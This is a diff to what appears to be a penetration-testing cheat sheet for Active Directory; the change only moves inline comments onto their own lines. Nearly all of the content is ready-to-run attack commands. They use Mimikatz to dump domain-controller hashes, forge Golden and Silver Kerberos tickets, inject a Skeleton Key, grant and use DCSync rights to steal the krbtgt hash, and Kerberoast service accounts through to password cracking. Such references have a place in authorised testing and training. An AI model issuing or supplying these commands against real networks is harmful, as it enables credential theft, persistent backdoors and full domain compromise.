@@ -325,47 +325,60 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:corporate.corp.loca
 
 - **Invoke-Mimikatz:**
 ```powershell
-Invoke-Mimikatz -Command '"lsadump::lsa /patch"'                                                                #Execute mimikatz on DC as DA to get hashes
-Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /krbtgt:0c88028bf3aa6a6a143ed846f2be1ea4 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'    #Golden Ticket
+# Execute mimikatz on DC as DA to get hashes
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+# Golden Ticket
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /krbtgt:0c88028bf3aa6a6a143ed846f2be1ea4 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 ```
 ### Silver Ticket
 - **Invoke-Mimikatz:**
 ```powershell
-Invoke-Mimikatz -Command '"kerberos::golden /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:0c88028bf3aa6a6a143ed846f2be1ea4 /user:Administrator /ptt"'    #Silver Ticket for service HOST
+# Silver Ticket for service HOST
+Invoke-Mimikatz -Command '"kerberos::golden /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:0c88028bf3aa6a6a143ed846f2be1ea4 /user:Administrator /ptt"'
 ```
 ### Skeleton Key
 - **Invoke-Mimikatz:**
 ```powershell
-Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'-ComputerName dcorp-dc.corporate.corp.local    #Command to inject a skeleton key
+# Command to inject a skeleton key
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'-ComputerName dcorp-dc.corporate.corp.local
 ```
 
 ## DCSync
 
 - **With PowerView and Invoke-Mimikatz:**
 ```powershell
-Get-ObjectAcl -DistinguishedName "dc=corporate,dc=corp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "user01") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}  #Check if user01 has these permissions
-Add-ObjectAcl -TargetDistinguishedName "dc=corporate,dc=corp,dc=local" -PrincipalSamAccountName user01 -Rights DCSync -Verbose  #If you are a domain admin, you can grant this permissions to any user
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'  #Gets the hash of krbtgt
+# Check if user01 has these permissions
+Get-ObjectAcl -DistinguishedName "dc=corporate,dc=corp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "user01") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
+# If you are a domain admin, you can grant this permissions to any user
+Add-ObjectAcl -TargetDistinguishedName "dc=corporate,dc=corp,dc=local" -PrincipalSamAccountName user01 -Rights DCSync -Verbose
+# Gets the hash of krbtgt
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
 
 # Privilege Escalation - Kerberoast
 
 **1. Enumeration with Powerview:**
 ```powershell
-Get-NetUser SPN           #Find user accounts used as Service accounts with PowerView
+# Find user accounts used as Service accounts with PowerView
+Get-NetUser SPN           
 ```
 **2. Enumeration with AD Module:**
 ```powershell
-Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName      #Find user accounts used as Service accounts
+# Find user accounts used as Service accounts
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
 ```
 **3. Request a TGS:**
 ```powershell
-Add-Type -AssemblyNAme System.IdentityModel                                                                                    #Request a TGS - Phase 1
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.corp.corporate.local" #Request a TGS - Phase 2
-klist                                                                                                                          #Check if the TGS has been granted
+# Request a TGS - Phase 1
+Add-Type -AssemblyNAme System.IdentityModel                                                                                 # Request a TGS - Phase 2 
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.corp.corporate.local" 
+# Check if the TGS has been granted
+klist
 ```
 **4. Export and crack TGS:**
 ```powershell
-Invoke-Mimikatz -Command '"kerberos::list /export"'                                                                                        #Export all tickets
-python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\3-40a10000-svcadmin@MSSQLSvc~dcorp-mgmt.corp.corporate.local-CORP.CORPORATE.LOCAL.kirbi #Crack the Service account password
+# Export all tickets
+Invoke-Mimikatz -Command '"kerberos::list /export"'
+# Crack the Service account password
+python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\3-40a10000-svcadmin@MSSQLSvc~dcorp-mgmt.corp.corporate.local-CORP.CORPORATE.LOCAL.kirbi
 ```
